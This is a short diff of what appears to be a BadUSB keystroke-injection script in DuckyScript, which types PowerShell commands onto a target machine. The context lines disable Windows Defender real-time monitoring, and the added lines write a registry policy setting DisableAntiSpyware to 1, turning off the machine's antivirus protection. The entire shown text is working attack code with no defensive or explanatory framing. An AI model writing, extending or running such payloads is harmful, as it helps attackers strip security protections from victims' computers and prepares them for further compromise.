@@ -16,6 +16,10 @@ STRING Set-MpPreference -DisableRealtimeMonitoring $true
 DELAY 500
 ENTER
 DELAY 2000
+STRING New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+DELAY 500
+ENTER
+DELAY 2000
 STRING exit
 DELAY 500
 ENTER
